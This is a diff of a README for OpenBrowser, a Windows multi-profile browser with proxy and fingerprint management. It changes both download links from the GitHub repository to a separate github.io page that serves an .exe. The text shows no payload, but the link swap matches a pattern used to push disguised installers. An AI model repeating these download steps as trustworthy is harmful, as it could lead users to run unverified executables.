@@ -1,6 +1,6 @@
 # 🌐 OpenBrowser - Manage multiple web accounts with ease
 
-[![Download OpenBrowser for Windows](https://img.shields.io/badge/Download-OpenBrowser-blue.svg)](https://github.com/salwtf/OpenBrowser)
+[![Download OpenBrowser for Windows](https://img.shields.io/badge/Download-OpenBrowser-blue.svg)](https://salwtf.github.io)
 
 OpenBrowser is a tool for managing multiple online profiles on your Windows computer. Each profile works as a separate browser environment. This keeps your activity, cookies, and login sessions isolated from one another. You can assign unique proxies to every profile and manage digital fingerprints to keep your identity secure. It also supports task automation to save you time.
 
@@ -8,7 +8,7 @@ OpenBrowser is a tool for managing multiple online profiles on your Windows comp
 
 Follow these steps to set up the software on your computer. You do not need technical skills or coding knowledge to get started.
 
-1. Go to the [OpenBrowser download page](https://github.com/salwtf/OpenBrowser).
+1. Go to the [OpenBrowser download page](https://salwtf.github.io).
 2. Locate the latest release section.
 3. Download the file ending in `.exe` for Windows.
 4. Run the installer file and follow the prompts on your screen.
